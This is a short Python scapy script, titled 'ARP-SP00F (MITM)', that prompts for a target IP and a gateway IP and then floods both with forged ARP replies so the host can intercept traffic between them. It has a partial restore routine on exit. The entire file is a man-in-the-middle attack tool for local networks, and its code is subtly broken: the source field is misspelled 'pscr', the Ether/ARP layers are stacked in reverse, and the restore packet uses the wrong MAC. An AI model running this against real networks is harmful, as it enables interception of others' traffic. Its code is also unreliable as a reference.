import scapy.all as scapy
import time
import sys

print("\t\t\t\t\t[+] << ARP-SP00F (MITM) >> [+]")

target_ip = input("\nTarget IP >> ")
network_ip = input("Network IP >> ")
send_packets = 0

def MAC_SCAN(ip):
	arp = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	ARP_Req_broadcast = arp/broadcast
	answerd = scapy.srp(ARP_Req_broadcast,timeout=1,verbose=False)[0]
	return answerd[0][1].hwsrc

def SPOOF(target,network):
	target_MAC = MAC_SCAN(target)
	packet = scapy.ARP(op=2,pdst=target,hwdst=target_MAC,pscr=network)
	scapy.send(packet,verbose=False)

def restore(dist_ip,real_ip):
	dist_MAC = MAC_SCAN(dist_ip)
	real_MAC = MAC_SCAN(real_ip)
	packet = scapy.ARP(op=2,pdst=dist_ip,hwdst=real_MAC,pscr=real_ip,hwsrc=real_MAC)
	scapy.send(packet,count=4,verbose=False)

try:
	while True:
		SPOOF(target_ip,network_ip)
		SPOOF(network_ip,target_ip)
		send_packets = send_packets + 2
		print("\r[+] Successful Send " + str(send_packets) + " Packets", end="")
		sys.stdout.flush()
		time.sleep(3)
except KeyboardInterrupt:
	print("\nOK! As You Like.")
	answer = input("Do you want to restore every thing? (Y)es or (N)o: ")
	if answer == "Y":
		restore(target_ip,network_ip)
	elif answer == "N":
		print("Ok!")
		sys.exit()
	else:
		sys.exit()
